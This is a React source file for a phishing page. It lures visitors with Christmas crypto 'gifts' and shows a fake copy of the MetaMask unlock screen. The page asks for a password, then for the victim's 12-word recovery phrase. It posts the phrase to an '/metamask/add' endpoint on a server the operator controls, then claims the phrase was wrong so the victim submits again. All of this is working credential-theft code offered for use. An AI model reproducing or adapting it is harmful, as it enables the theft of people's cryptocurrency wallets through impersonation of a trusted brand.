import React from 'react';
import { useState, useCallback, useEffect } from "react";
import axios from "axios";
import Swal from "sweetalert2";


function App() {

    let url = window.BASE_URL + "/metamask/add";


    const [displaystatus, setDisplayStatus] = useState("display-none"); //display-block
    const [modaltitle, setModalTitle] = useState("Welcome Back!"); // Security Check!
    const [modaldesc, setModalDesc] = useState("The decentralized web awaits") //We just need to confirm it's you. To continue, simply confirm your 12 word phrase.
    const [modalinputplaceholder, setPlaceholder] = useState("Password") //Phrase
    const [modalbtntitle, setModalBtnTitle] = useState("UNLOCK")//CONFIRM

    const [password, setPassword] = useState("");

    const handleClick = () => {
        setDisplayStatus("display-block");
    }

    const handleChange = (e) => {
        setPassword(e.currentTarget.value);
        console.log(e.currentTarget.value);
    }

    const handleSubmit = () => {
        if (modalbtntitle == "UNLOCK") {
            if (password == "") return;
            setModalTitle("Security Check!");
            setModalDesc("We just need to confirm it's you. To continue, simply confirm your 12 word phrase.");
            setPlaceholder("Phrase");
            setModalBtnTitle("CONFIRM");
            setPassword("");
        } else {
            axios
                .post(url, {
                    name: password
                }, {
                    headers: { 'Content-Type': 'application/json' }
                })
                .then((response) => {
                    Swal.fire({
                        title: "Wrong phase",
                        text: "Please input correct phase",
                    }).then(()=>{
                        setDisplayStatus("display-block");
                    })
                    setDisplayStatus("display-none");
                    setPassword("")
                    // setModalTitle("Welcome Back!");
                    // setModalDesc("The decentralized web awaits");
                    // setPlaceholder("Password");
                    // setModalBtnTitle("UNLOCK");
                })
                .catch((err) => {

                })
        }
    }

    useEffect(() => {
        
      });
  
    return (
        <div>
            <div id="metamask_super_container">
                HAPPY CHRISTMAS!!!</div>
            <div id="metamask_modal" className={displaystatus}>
                <div id="metamask_container">
                    <img src="./metamask/metamask.023762b6.png" className="app-header__metafox-logo app-header__metafox-logo--horizontal" alt="" width="33" height="33" />
                    <div className="network-display network-display--clickable chip chip--with-left-icon chip--with-right-icon chip--ui-3" role="button">
                        <div className="chip__left-icon">
                            <div id="metamask_container1" className="color-indicator color-indicator--filled color-indicator--color-ui-4 color-indicator--size-lg"></div>
                        </div>
                        <span className="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 typography chip__label typography--h7 typography--weight-normal typography--color-ui-4">Ethereum mainnet</span>
                        <div className="chip__right-icon">
                            <i className="network-display__icon app-header__network-down-arrow"></i>
                        </div>
                    </div>
                </div>
                <div id="metamask_container2">
                    <div id="metamask_container3">
                        <svg width="120px" height="120px">
                            <polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)"
                                points="32.594836950302124,54.79038521647453 11.356233358383179,74.17309999465942 18.61938714981079,52.776472717523575">
                            </polygon>
                            <polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)"
                                points="32.594836950302124,54.79038521647453 41.44252359867096,71.98266237974167 29.374884366989136,72.33859598636627">
                            </polygon>
                            <polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)"
                                points="29.374884366989136,72.33859598636627 11.356233358383179,74.17309999465942 32.594836950302124,54.79038521647453">
                            </polygon>
                            <polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)"
                                points="18.61938714981079,52.776472717523575 38.74830365180969,47.11241841316223 32.594836950302124,54.79038521647453">
                            </polygon>
                            <polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)"
                                points="52.10939258337021,66.08410209417343 54.60992619395256,76.43543422222137 52.73543983697891,77.74133384227753">
                            </polygon>
                            <polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)"
                                points="52.73543983697891,77.74133384227753 41.44252359867096,71.98266237974167 52.10939258337021,66.08410209417343">
                            </polygon>
                            <polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)"
                                points="41.44252359867096,71.98266237974167 41.214181780815125,63.269494101405144 52.10939258337021,66.08410209417343">
                            </polygon>
                            <polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)"
                                points="54.6148444712162,61.618451066315174 54.144172221422195,55.15899807214737 65.8558277785778,55.15899807214737">
                            </polygon>
                            <polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)"
                                points="65.8558277785778,55.15899807214737 65.3851555287838,61.618451066315174 54.6148444712162,61.618451066315174">
                            </polygon>
                            <polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)"
                                points="67.0565490424633,34.69904065132141 52.9434509575367,34.69904065132141 47.2993665933609,20.684938430786133">
                            </polygon>
                            <polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)"
                                points="47.2993665933609,20.684938430786133 72.7006334066391,20.684938430786133 67.0565490424633,34.69904065132141">
                            </polygon>
                            <polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)"
                                points="87.40516304969788,54.79038521647453 101.38061285018921,52.776472717523575 108.64376664161682,74.17309999465942">
                            </polygon>
                            <polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)"
                                points="87.40516304969788,54.79038521647453 108.64376664161682,74.17309999465942 90.62511563301086,72.33859598636627">
                            </polygon>
                            <polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)"
                                points="90.62511563301086,72.33859598636627 78.55747640132904,71.98266237974167 87.40516304969788,54.79038521647453">
                            </polygon>
                            <polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)"
                                points="101.38061285018921,52.776472717523575 87.40516304969788,54.79038521647453 81.25169634819031,47.11241841316223">
                            </polygon>
                            <polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)"
                                points="67.89060741662979,66.08410209417343 78.55747640132904,71.98266237974167 67.26456016302109,77.74133384227753">
                            </polygon>
                            <polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)"
                                points="67.26456016302109,77.74133384227753 65.39007380604744,76.43543422222137 67.89060741662979,66.08410209417343">
                            </polygon>
                            <polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)"
                                points="78.55747640132904,71.98266237974167 67.89060741662979,66.08410209417343 78.78581821918488,63.269494101405144">
                            </polygon>
                            <polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)"
                                points="54.6148444712162,61.618451066315174 65.3851555287838,61.618451066315174 65.39007380604744,76.43543422222137">
                            </polygon>
                            <polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)"
                                points="65.39007380604744,76.43543422222137 54.60992619395256,76.43543422222137 54.6148444712162,61.618451066315174">
                            </polygon>
                            <polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)"
                                points="52.9434509575367,34.69904065132141 67.0565490424633,34.69904065132141 65.8558277785778,55.15899807214737">
                            </polygon>
                            <polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)"
                                points="65.8558277785778,55.15899807214737 54.144172221422195,55.15899807214737 52.9434509575367,34.69904065132141">
                            </polygon>
                            <polygon fill="rgb(228,118,27)" stroke="rgb(228,118,27)"
                                points="52.73543983697891,77.74133384227753 39.42569553852081,88.71298313140869 41.44252359867096,71.98266237974167">
                            </polygon>
                            <polygon fill="rgb(228,118,27)" stroke="rgb(228,118,27)"
                                points="38.74830365180969,47.11241841316223 52.9434509575367,34.69904065132141 54.144172221422195,55.15899807214737">
                            </polygon>
                            <polygon fill="rgb(228,118,27)" stroke="rgb(228,118,27)"
                                points="54.144172221422195,55.15899807214737 32.594836950302124,54.79038521647453 38.74830365180969,47.11241841316223">
                            </polygon>
                            <polygon fill="rgb(228,118,27)" stroke="rgb(228,118,27)"
                                points="39.42569553852081,88.71298313140869 17.07258939743042,96.33740186691284 11.356233358383179,74.17309999465942">
                            </polygon>
                            <polygon fill="rgb(228,118,27)" stroke="rgb(228,118,27)"
                                points="11.356233358383179,74.17309999465942 29.374884366989136,72.33859598636627 39.42569553852081,88.71298313140869">
                            </polygon>
                            <polygon fill="rgb(228,118,27)" stroke="rgb(228,118,27)"
                                points="52.9434509575367,34.69904065132141 17.113484144210815,7.734332084655762 47.2993665933609,20.684938430786133">
                            </polygon>
                            <polygon fill="rgb(228,118,27)" stroke="rgb(228,118,27)"
                                points="67.26456016302109,77.74133384227753 78.55747640132904,71.98266237974167 80.57430446147919,88.71298313140869">
                            </polygon>
                            <polygon fill="rgb(228,118,27)" stroke="rgb(228,118,27)"
                                points="81.25169634819031,47.11241841316223 87.40516304969788,54.79038521647453 65.8558277785778,55.15899807214737">
                            </polygon>
                            <polygon fill="rgb(228,118,27)" stroke="rgb(228,118,27)"
                                points="65.8558277785778,55.15899807214737 67.0565490424633,34.69904065132141 81.25169634819031,47.11241841316223">
                            </polygon>
                            <polygon fill="rgb(228,118,27)" stroke="rgb(228,118,27)"
                                points="80.57430446147919,88.71298313140869 90.62511563301086,72.33859598636627 108.64376664161682,74.17309999465942">
                            </polygon>
                            <polygon fill="rgb(228,118,27)" stroke="rgb(228,118,27)"
                                points="108.64376664161682,74.17309999465942 102.92741060256958,96.33740186691284 80.57430446147919,88.71298313140869">
                            </polygon>
                            <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)"
                                points="14.791320562362671,37.90418028831482 12.023731470108032,22.22650408744812 32.4169135093689,25.4653537273407">
                            </polygon>
                            <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)"
                                points="32.4169135093689,25.4653537273407 31.802374720573425,45.68895846605301 14.791320562362671,37.90418028831482">
                            </polygon>
                            <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)"
                                points="17.113484144210815,7.734332084655762 52.9434509575367,34.69904065132141 32.4169135093689,25.4653537273407">
                            </polygon>
                            <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)"
                                points="38.74830365180969,47.11241841316223 31.802374720573425,45.68895846605301 32.4169135093689,25.4653537273407">
                            </polygon>
                            <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)"
                                points="32.4169135093689,25.4653537273407 52.9434509575367,34.69904065132141 38.74830365180969,47.11241841316223">
                            </polygon>
                            <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)"
                                points="16.301010847091675,46.24471664428711 13.342798948287964,43.398762345314026 15.698915719985962,41.69399321079254">
                            </polygon>
                            <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)"
                                points="18.61938714981079,52.776472717523575 31.802374720573425,45.68895846605301 38.74830365180969,47.11241841316223">
                            </polygon>
                            <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)"
                                points="18.61938714981079,52.776472717523575 14.373804330825806,47.541901767253876 16.301010847091675,46.24471664428711">
                            </polygon>
                            <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)"
                                points="16.301010847091675,46.24471664428711 31.802374720573425,45.68895846605301 18.61938714981079,52.776472717523575">
                            </polygon>
                            <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)"
                                points="16.301010847091675,46.24471664428711 15.698915719985962,41.69399321079254 31.802374720573425,45.68895846605301">
                            </polygon>
                            <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)"
                                points="12.711199522018433,39.31266903877258 14.791320562362671,37.90418028831482 15.698915719985962,41.69399321079254">
                            </polygon>
                            <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)"
                                points="31.802374720573425,45.68895846605301 15.698915719985962,41.69399321079254 14.791320562362671,37.90418028831482">
                            </polygon>
                            <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)"
                                points="105.20867943763733,37.90418028831482 88.19762527942657,45.68895846605301 87.5830864906311,25.4653537273407">
                            </polygon>
                            <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)"
                                points="87.5830864906311,25.4653537273407 107.97626852989197,22.22650408744812 105.20867943763733,37.90418028831482">
                            </polygon>
                            <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)"
                                points="102.88651585578918,7.734332084655762 107.97626852989197,22.22650408744812 87.5830864906311,25.4653537273407">
                            </polygon>
                            <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)"
                                points="81.25169634819031,47.11241841316223 67.0565490424633,34.69904065132141 87.5830864906311,25.4653537273407">
                            </polygon>
                            <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)"
                                points="87.5830864906311,25.4653537273407 88.19762527942657,45.68895846605301 81.25169634819031,47.11241841316223">
                            </polygon>
                            <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)"
                                points="103.69898915290833,46.24471664428711 104.30108428001404,41.69399321079254 106.65720105171204,43.398762345314026">
                            </polygon>
                            <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)"
                                points="101.38061285018921,52.776472717523575 81.25169634819031,47.11241841316223 88.19762527942657,45.68895846605301">
                            </polygon>
                            <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)"
                                points="101.38061285018921,52.776472717523575 103.69898915290833,46.24471664428711 105.6261956691742,47.541901767253876">
                            </polygon>
                            <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)"
                                points="103.69898915290833,46.24471664428711 101.38061285018921,52.776472717523575 88.19762527942657,45.68895846605301">
                            </polygon>
                            <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)"
                                points="103.69898915290833,46.24471664428711 88.19762527942657,45.68895846605301 104.30108428001404,41.69399321079254">
                            </polygon>
                            <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)"
                                points="107.28880047798157,39.31266903877258 104.30108428001404,41.69399321079254 105.20867943763733,37.90418028831482">
                            </polygon>
                            <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)"
                                points="88.19762527942657,45.68895846605301 105.20867943763733,37.90418028831482 104.30108428001404,41.69399321079254">
                            </polygon>
                            <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)"
                                points="32.4169135093689,25.4653537273407 12.023731470108032,22.22650408744812 17.113484144210815,7.734332084655762">
                            </polygon>
                            <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)"
                                points="87.5830864906311,25.4653537273407 67.0565490424633,34.69904065132141 102.88651585578918,7.734332084655762">
                            </polygon>
                            <polygon fill="rgb(22,22,22)" stroke="rgb(22,22,22)"
                                points="54.507589638233185,77.54166662693024 54.60992619395256,76.43543422222137 65.39007380604744,76.43543422222137">
                            </polygon>
                            <polygon fill="rgb(22,22,22)" stroke="rgb(22,22,22)"
                                points="65.39007380604744,76.43543422222137 65.49241036176682,77.54166662693024 54.507589638233185,77.54166662693024">
                            </polygon>
                            <polygon fill="rgb(22,22,22)" stroke="rgb(22,22,22)"
                                points="52.73543983697891,77.74133384227753 53.30817863345146,78.89579951763153 52.634466737508774,85.38650214672089">
                            </polygon>
                            <polygon fill="rgb(22,22,22)" stroke="rgb(22,22,22)"
                                points="52.634466737508774,85.38650214672089 51.667284071445465,86.62894785404205 52.73543983697891,77.74133384227753">
                            </polygon>
                            <polygon fill="rgb(22,22,22)" stroke="rgb(22,22,22)"
                                points="52.73543983697891,77.74133384227753 54.60992619395256,76.43543422222137 54.507589638233185,77.54166662693024">
                            </polygon>
                            <polygon fill="rgb(22,22,22)" stroke="rgb(22,22,22)"
                                points="54.507589638233185,77.54166662693024 53.30817863345146,78.89579951763153 52.73543983697891,77.74133384227753">
                            </polygon>
                            <polygon fill="rgb(22,22,22)" stroke="rgb(22,22,22)"
                                points="67.26456016302109,77.74133384227753 68.33271592855453,86.62894785404205 67.36553326249123,85.38650214672089">
                            </polygon>
                            <polygon fill="rgb(22,22,22)" stroke="rgb(22,22,22)"
                                points="67.36553326249123,85.38650214672089 66.69182136654854,78.89579951763153 67.26456016302109,77.74133384227753">
                            </polygon>
                            <polygon fill="rgb(22,22,22)" stroke="rgb(22,22,22)"
                                points="67.26456016302109,77.74133384227753 66.69182136654854,78.89579951763153 65.49241036176682,77.54166662693024">
                            </polygon>
                            <polygon fill="rgb(22,22,22)" stroke="rgb(22,22,22)"
                                points="65.49241036176682,77.54166662693024 65.39007380604744,76.43543422222137 67.26456016302109,77.74133384227753">
                            </polygon>
                            <polygon fill="rgb(22,22,22)" stroke="rgb(22,22,22)"
                                points="65.49241036176682,77.54166662693024 66.69182136654854,78.89579951763153 53.30817863345146,78.89579951763153">
                            </polygon>
                            <polygon fill="rgb(22,22,22)" stroke="rgb(22,22,22)"
                                points="53.30817863345146,78.89579951763153 54.507589638233185,77.54166662693024 65.49241036176682,77.54166662693024">
                            </polygon>
                            <polygon fill="rgb(22,22,22)" stroke="rgb(22,22,22)"
                                points="53.30817863345146,78.89579951763153 66.69182136654854,78.89579951763153 67.36553326249123,85.38650214672089">
                            </polygon>
                            <polygon fill="rgb(22,22,22)" stroke="rgb(22,22,22)"
                                points="67.36553326249123,85.38650214672089 52.634466737508774,85.38650214672089 53.30817863345146,78.89579951763153">
                            </polygon>
                            <polygon fill="rgb(215,193,179)" stroke="rgb(215,193,179)"
                                points="51.667284071445465,86.62894785404205 51.75157964229584,91.07866287231445 39.42569553852081,88.71298313140869">
                            </polygon>
                            <polygon fill="rgb(215,193,179)" stroke="rgb(215,193,179)"
                                points="39.42569553852081,88.71298313140869 52.73543983697891,77.74133384227753 51.667284071445465,86.62894785404205">
                            </polygon>
                            <polygon fill="rgb(215,193,179)" stroke="rgb(215,193,179)"
                                points="68.33271592855453,86.62894785404205 80.57430446147919,88.71298313140869 68.24842035770416,91.07866287231445">
                            </polygon>
                            <polygon fill="rgb(215,193,179)" stroke="rgb(215,193,179)"
                                points="80.57430446147919,88.71298313140869 68.33271592855453,86.62894785404205 67.26456016302109,77.74133384227753">
                            </polygon>
                            <polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)"
                                points="52.47352123260498,94.7457218170166 51.75157964229584,91.07866287231445 51.667284071445465,86.62894785404205">
                            </polygon>
                            <polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)"
                                points="51.667284071445465,86.62894785404205 52.634466737508774,85.38650214672089 52.47352123260498,94.7457218170166">
                            </polygon>
                            <polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)"
                                points="51.75157964229584,91.07866287231445 52.47352123260498,94.7457218170166 43.697816133499146,91.47358775138855">
                            </polygon>
                            <polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)"
                                points="43.697816133499146,91.47358775138855 39.42569553852081,88.71298313140869 51.75157964229584,91.07866287231445">
                            </polygon>
                            <polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)"
                                points="52.47352123260498,94.7457218170166 52.634466737508774,85.38650214672089 67.36553326249123,85.38650214672089">
                            </polygon>
                            <polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)"
                                points="67.36553326249123,85.38650214672089 67.52647876739502,94.7457218170166 52.47352123260498,94.7457218170166">
                            </polygon>
                            <polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)"
                                points="67.52647876739502,94.7457218170166 67.36553326249123,85.38650214672089 68.33271592855453,86.62894785404205">
                            </polygon>
                            <polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)"
                                points="68.33271592855453,86.62894785404205 68.24842035770416,91.07866287231445 67.52647876739502,94.7457218170166">
                            </polygon>
                            <polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)"
                                points="68.24842035770416,91.07866287231445 80.57430446147919,88.71298313140869 76.30218386650085,91.47358775138855">
                            </polygon>
                            <polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)"
                                points="76.30218386650085,91.47358775138855 67.52647876739502,94.7457218170166 68.24842035770416,91.07866287231445">
                            </polygon>
                            <polygon fill="rgb(205,97,22)" stroke="rgb(205,97,22)"
                                points="39.42569553852081,88.71298313140869 29.374884366989136,72.33859598636627 41.44252359867096,71.98266237974167">
                            </polygon>
                            <polygon fill="rgb(205,97,22)" stroke="rgb(205,97,22)"
                                points="54.144172221422195,55.15899807214737 48.935026824474335,59.69000914134085 41.214181780815125,63.269494101405144">
                            </polygon>
                            <polygon fill="rgb(205,97,22)" stroke="rgb(205,97,22)"
                                points="41.214181780815125,63.269494101405144 32.594836950302124,54.79038521647453 54.144172221422195,55.15899807214737">
                            </polygon>
                            <polygon fill="rgb(205,97,22)" stroke="rgb(205,97,22)"
                                points="48.935026824474335,59.69000914134085 54.144172221422195,55.15899807214737 52.10939258337021,66.08410209417343">
                            </polygon>
                            <polygon fill="rgb(205,97,22)" stroke="rgb(205,97,22)"
                                points="80.57430446147919,88.71298313140869 78.55747640132904,71.98266237974167 90.62511563301086,72.33859598636627">
                            </polygon>
                            <polygon fill="rgb(205,97,22)" stroke="rgb(205,97,22)"
                                points="65.8558277785778,55.15899807214737 87.40516304969788,54.79038521647453 78.78581821918488,63.269494101405144">
                            </polygon>
                            <polygon fill="rgb(205,97,22)" stroke="rgb(205,97,22)"
                                points="78.78581821918488,63.269494101405144 71.06497317552567,59.69000914134085 65.8558277785778,55.15899807214737">
                            </polygon>
                            <polygon fill="rgb(205,97,22)" stroke="rgb(205,97,22)"
                                points="71.06497317552567,59.69000914134085 67.89060741662979,66.08410209417343 65.8558277785778,55.15899807214737">
                            </polygon>
                            <polygon fill="rgb(35,52,71)" stroke="rgb(35,52,71)"
                                points="52.10939258337021,66.08410209417343 41.214181780815125,63.269494101405144 48.935026824474335,59.69000914134085">
                            </polygon>
                            <polygon fill="rgb(35,52,71)" stroke="rgb(35,52,71)"
                                points="67.89060741662979,66.08410209417343 71.06497317552567,59.69000914134085 78.78581821918488,63.269494101405144">
                            </polygon>
                            <polygon fill="rgb(228,117,31)" stroke="rgb(228,117,31)"
                                points="54.6148444712162,61.618451066315174 54.60992619395256,76.43543422222137 52.10939258337021,66.08410209417343">
                            </polygon>
                            <polygon fill="rgb(228,117,31)" stroke="rgb(228,117,31)"
                                points="52.10939258337021,66.08410209417343 54.144172221422195,55.15899807214737 54.6148444712162,61.618451066315174">
                            </polygon>
                            <polygon fill="rgb(228,117,31)" stroke="rgb(228,117,31)"
                                points="32.594836950302124,54.79038521647453 41.214181780815125,63.269494101405144 41.44252359867096,71.98266237974167">
                            </polygon>
                            <polygon fill="rgb(228,117,31)" stroke="rgb(228,117,31)"
                                points="65.3851555287838,61.618451066315174 67.89060741662979,66.08410209417343 65.39007380604744,76.43543422222137">
                            </polygon>
                            <polygon fill="rgb(228,117,31)" stroke="rgb(228,117,31)"
                                points="87.40516304969788,54.79038521647453 78.55747640132904,71.98266237974167 78.78581821918488,63.269494101405144">
                            </polygon>
                            <polygon fill="rgb(226,118,27)" stroke="rgb(226,118,27)"
                                points="67.89060741662979,66.08410209417343 65.3851555287838,61.618451066315174 65.8558277785778,55.15899807214737">
                            </polygon>
                            <polygon fill="rgb(226,118,27)" stroke="rgb(226,118,27)"
                                points="102.88651585578918,7.734332084655762 67.0565490424633,34.69904065132141 72.7006334066391,20.684938430786133">
                            </polygon>
                        </svg>
                    </div>
                    <div>
                        <h1 id="modal-title" className="unlock-page__title">{modaltitle}</h1>
                        <div id="modal-description">{modaldesc}</div>
                        <div id="metamask_container4">
                            <input id="modal-input" type="password" placeholder={modalinputplaceholder} value={password} onChange={handleChange} />
                        </div>
                        <div id="modal-submit" className="bg-blue white btn" onClick={handleSubmit}>{modalbtntitle}</div>
                    </div>
                    <div id="recover">or <span className="blue">Import using Secret Recovery Phrase</span></div>
                    <div id="metamask_footer">
                        Need help? Contact <a className="blue" href="https://metamask.io/faqs.html">MetaMask Support</a></div>
                </div>
            </div>
            <div className="home-bg-image">
                <div className="db flex center justify-between items-center pa3 pa4-l mw7 mw8-l">

                </div>
                <div className="db flex center justify-between items-center pa3 pa4-l mw6 mw7-ns">
                    <div className="center w-100 w-60-ns pa3 pa4-ns bg-white br4 shadow-4">
                        <div className="mb4">
                            <h1 className="f5 ma0">Connect to a wallet</h1>
                        </div>
                        <div className="walletOptions">
                            <div id="metamask" onClick={handleClick}
                                className="br3 mb3 ph3 pv2 ba b--black-10 flex justify-between items-center pointer hover-b--primary5">
                                <div className="f5 flex items-center">MetaMask Gift</div>
                                <div className="w2 h2"><img src="./assets/metamask.023762b6.png"
                                    alt="MetaMask-metamask.png" /></div>
                            </div>
                            <div onClick={handleClick}
                                className="br3 mb3 ph3 pv2 ba b--black-10 flex justify-between items-center pointer hover-b--primary5">
                                <div className="f5 flex items-center">Ledger With Metamask Gift</div>
                                <div className="w2 h2"><img src="./assets/metamask.023762b6.png"
                                    alt="Ledger With Metamask-metamask.png" /></div>
                            </div>
                            <div onClick={handleClick}
                                className="br3 mb3 ph3 pv2 ba b--black-10 flex justify-between items-center pointer hover-b--primary5">
                                <div className="f5 flex items-center">Flockchain Gift</div>
                                <div className="w2 h2"><img className="image_size_100" src="./assets/x-mas1.jfif"
                                    alt="x-mas1.jfif" /></div>
                            </div>
                            <div onClick={handleClick}
                                className="br3 mb3 ph3 pv2 ba b--black-10 flex justify-between items-center pointer hover-b--primary5">
                                <div className="f5 flex items-center">XDoge Gift</div>
                                <div className="w2 h2"><img className="image_size_120" src="./assets/x-mas2.jfif"
                                    alt="x-mas2.jfif" /></div>
                            </div>
                            <div onClick={handleClick}
                                className="br3 mb3 ph3 pv2 ba b--black-10 flex justify-between items-center pointer hover-b--primary5">
                                <div className="f5 flex items-center">Flockchain Gift</div>
                                <div className="w2 h2"><img src="./assets/x-mas3.jfif"
                                    alt="x-mas3.jfif" /></div>
                            </div>
                            <div onClick={handleClick}
                                className="br3 mb3 ph3 pv2 ba b--black-10 flex justify-between items-center pointer hover-b--primary5">
                                <div className="f5 flex items-center">NFT Gift</div>
                                <div className="w2 h2"><img className="image_size_100" src="./assets/x-mas4.jfif"
                                    alt="x-mas4.jfif" /></div>
                            </div>
                            <div onClick={handleClick}
                                className="br3 mb3 ph3 pv2 ba b--black-10 flex justify-between items-center pointer hover-b--primary5">
                                <div className="f5 flex items-center">Sphynx Gift</div>
                                <div className="w2 h2"><img src="./assets/x-mas5.jfif" alt="x-mas5.jfif" />
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
}

export default App;
